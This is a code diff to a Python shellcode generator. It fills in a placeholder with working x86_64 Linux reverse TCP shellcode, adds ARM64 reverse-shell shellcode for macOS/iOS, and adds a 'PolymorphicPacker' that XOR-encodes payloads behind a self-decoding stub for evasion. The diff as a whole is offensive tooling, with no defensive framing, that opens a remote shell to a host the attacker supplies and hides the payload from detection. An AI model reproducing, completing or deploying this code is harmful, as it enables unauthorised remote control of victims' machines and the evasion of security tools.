@@ -1,4 +1,5 @@
 import struct
+import random
 
 class ShellcodeGenerator:
     """
@@ -222,9 +223,42 @@ class ShellcodeGenerator:
     @staticmethod
     def x86_64_reverse_tcp(lhost, lport):
         """
-        Placeholder for x86_64 weaponization.
+        Generates weaponized x86_64 Linux reverse TCP shellcode.
         """
-        return b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
+        ip_parts = [int(x) for x in lhost.split(".")]
+        ip_bytes = bytes(ip_parts)
+        port_bytes = struct.pack(">H", int(lport))
+        
+        sockaddr = b"\x02\x00" + port_bytes + ip_bytes
+        sockaddr_val = struct.unpack("<Q", sockaddr)[0]
+
+        shellcode = b""
+        
+        # sys_socket (AF_INET=2, SOCK_STREAM=1, 0)
+        shellcode += b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05"
+        
+        # sys_connect (sockfd, &sockaddr, 16)
+        shellcode += b"\x48\x89\xc7" # mov rdi, rax
+        shellcode += b"\x48\xbb" + struct.pack("<Q", sockaddr_val) # mov rbx, sockaddr
+        shellcode += b"\x53" # push rbx
+        shellcode += b"\x48\x89\xe6" # mov rsi, rsp
+        shellcode += b"\x6a\x10\x5a" # push 16; pop rdx
+        shellcode += b"\x6a\x2a\x58" # push 42; pop rax
+        shellcode += b"\x0f\x05" # syscall
+        
+        # sys_dup2 loop (sockfd to stdin, stdout, stderr)
+        shellcode += b"\x6a\x03\x5e" # push 3; pop rsi
+        # loop_start:
+        shellcode += b"\x48\xff\xce" # dec rsi
+        shellcode += b"\x6a\x21\x58" # push 33; pop rax
+        shellcode += b"\x0f\x05" # syscall
+        shellcode += b"\x75\xf6" # jnz loop_start
+        
+        # sys_execve ("/bin/sh", NULL, NULL)
+        shellcode += b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
+        shellcode += b"\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05"
+
+        return shellcode
 
     @staticmethod
     def armv7_reverse_tcp(lhost, lport):
@@ -294,3 +328,119 @@ class ShellcodeGenerator:
         shellcode += b"\x0d\x00\xa0\xe1\x00\x10\xa0\xe3\x00\x20\xa0\xe3\x0b\x70\xa0\xe3\x00\x00\x00\xef"
 
         return shellcode
+
+    @staticmethod
+    def apple_a_series_reverse_tcp(lhost, lport):
+        """
+        Generates Apple A-Series (macOS / iOS) ARM64 reverse TCP shellcode.
+        Utilizes the XNU kernel convention (syscalls via X16, svc 0x80) and 
+        the BSD-specific sockaddr_in structure.
+        """
+        # BSD sockaddr_in requires sin_len (16) at byte 0 and sin_family (2) at byte 1
+        family_bytes = b"\x10\x02" 
+        port_bytes = struct.pack(">H", int(lport))
+        ip_parts = [int(x) for x in lhost.split(".")]
+        ip_bytes = bytes(ip_parts)
+        
+        struct_bytes = family_bytes + port_bytes + ip_bytes
+        val64 = struct.unpack("<Q", struct_bytes)[0]
+        
+        imm0  = (val64 >> 0) & 0xFFFF
+        imm16 = (val64 >> 16) & 0xFFFF
+        imm32 = (val64 >> 32) & 0xFFFF
+        imm48 = (val64 >> 48) & 0xFFFF
+
+        def arm64_movz(reg, imm16):
+            return struct.pack("<I", 0xd2800000 | reg | (imm16 << 5))
+        def arm64_movk(reg, imm16, shift):
+            hw = shift // 16
+            return struct.pack("<I", 0xf2800000 | (hw << 21) | reg | (imm16 << 5))
+
+        shellcode = b""
+        
+        # --- SYS_SOCKET (97) ---
+        shellcode += struct.pack("<I", 0xd2800040) # mov x0, #2
+        shellcode += struct.pack("<I", 0xd2800021) # mov x1, #1
+        shellcode += struct.pack("<I", 0xd2800002) # mov x2, #0
+        shellcode += struct.pack("<I", 0xd2800c30) # mov x16, #97 (0x61)
+        shellcode += struct.pack("<I", 0xd4001001) # svc #0x80
+        shellcode += struct.pack("<I", 0xaa0003ec) # mov x12, x0
+
+        # --- SYS_CONNECT (98) ---
+        shellcode += arm64_movz(1, imm0)
+        shellcode += arm64_movk(1, imm16, 16)
+        shellcode += arm64_movk(1, imm32, 32)
+        shellcode += arm64_movk(1, imm48, 48)
+        shellcode += struct.pack("<I", 0xf81f0ffe) # str x1, [sp, #-16]!
+        
+        shellcode += struct.pack("<I", 0xaa0c03e0) # mov x0, x12
+        shellcode += struct.pack("<I", 0x910003e1) # mov x1, sp
+        shellcode += struct.pack("<I", 0xd2800202) # mov x2, #16
+        shellcode += struct.pack("<I", 0xd2800c50) # mov x16, #98 (0x62)
+        shellcode += struct.pack("<I", 0xd4001001) # svc #0x80
+
+        # --- SYS_DUP2 (90) ---
+        for fd in range(3):
+            shellcode += struct.pack("<I", 0xaa0c03e0) # mov x0, x12
+            shellcode += struct.pack("<I", 0xd2800001 | (fd << 5)) # mov x1, fd
+            shellcode += struct.pack("<I", 0xd2800b50) # mov x16, #90 (0x5a)
+            shellcode += struct.pack("<I", 0xd4001001) # svc #0x80
+
+        # --- SYS_EXECVE (59) ---
+        shellcode += struct.pack("<I", 0xd28e65e0) # movz x0, #0x732f
+        shellcode += struct.pack("<I", 0xf2aee720) # movk x0, #0x7379, lsl #16
+        shellcode += struct.pack("<I", 0xf2ccae80) # movk x0, #0x6574, lsl #32
+        shellcode += struct.pack("<I", 0xf2e5ed00) # movk x0, #0x2f6d, lsl #48
+        shellcode += struct.pack("<I", 0xf81f0ffe) # str x0, [sp, #-16]!
+        
+        shellcode += struct.pack("<I", 0xd28d2c40) # movz x0, #0x6962
+        shellcode += struct.pack("<I", 0xf2a5ede0) # movk x0, #0x2f6e, lsl #16
+        shellcode += struct.pack("<I", 0xf2cd0e60) # movk x0, #0x6873, lsl #32
+        shellcode += struct.pack("<I", 0xf2e00000) # movk x0, #0x0000, lsl #48
+        shellcode += struct.pack("<I", 0xf81f0ffe) # str x0, [sp, #-16]!
+
+        shellcode += struct.pack("<I", 0x910003e0) # mov x0, sp
+        shellcode += struct.pack("<I", 0xaa1f03e1) # mov x1, xzr
+        shellcode += struct.pack("<I", 0xaa1f03e2) # mov x2, xzr
+        shellcode += struct.pack("<I", 0xd2800770) # mov x16, #59 (0x3b)
+        shellcode += struct.pack("<I", 0xd4001001) # svc #0x80
+
+        return shellcode
+
+
+class PolymorphicPacker:
+    """
+    Encodes raw shellcode payload using a randomized key and prepends an architecture
+    specific self-modifying assembly stub that decodes the payload in memory just
+    before execution.
+    """
+    @staticmethod
+    def pack(arch, shellcode):
+        key = random.randint(1, 255)
+        encoded = bytes([b ^ key for b in shellcode])
+        length = len(encoded)
+
+        if arch in ["x86_64", "x64"]:
+            stub = b"\xeb\x0e"  # jmp 0x0e
+            stub += b"\x5f"      # pop rdi
+            stub += b"\x48\xc7\xc1" + struct.pack("<I", length) # mov rcx, length
+            stub += b"\x80\x74\x0f\xff" + bytes([key])          # loop: xor byte [rdi+rcx-1], key
+            stub += b"\xe2\xf8"  # loop loop_start
+            stub += b"\xff\xe7"  # jmp rdi
+            stub += b"\xe8\xed\xff\xff\xff" # call decoder (pop rdi)
+            return stub + encoded
+
+        elif arch in ["arm64", "aarch64", "apple_a_series"]:
+            stub = b"\xc0\x00\x00\x10"                          # adr x0, #24
+            stub += struct.pack("<I", 0xd2800001 | (length << 5)) # movz x1, #length
+            stub += struct.pack("<I", 0xd2800002 | (key << 5))    # movz x2, #key
+            stub += b"\x03\x00\x40\x39"                         # loop: ldrb w3, [x0]
+            stub += b"\x63\x00\x02\x4a"                         # eor w3, w3, w2
+            stub += b"\x03\x04\x00\x38"                         # strb w3, [x0], #1
+            stub += b"\x21\x04\x00\xf1"                         # subs x1, x1, #1
+            stub += b"\x81\xff\xff\x54"                         # b.ne loop
+            return stub + encoded
+
+        else:
+            print(f"[-] Warning: Evasion packing not yet implemented for {arch}. Returning raw shellcode.")
+            return shellcode
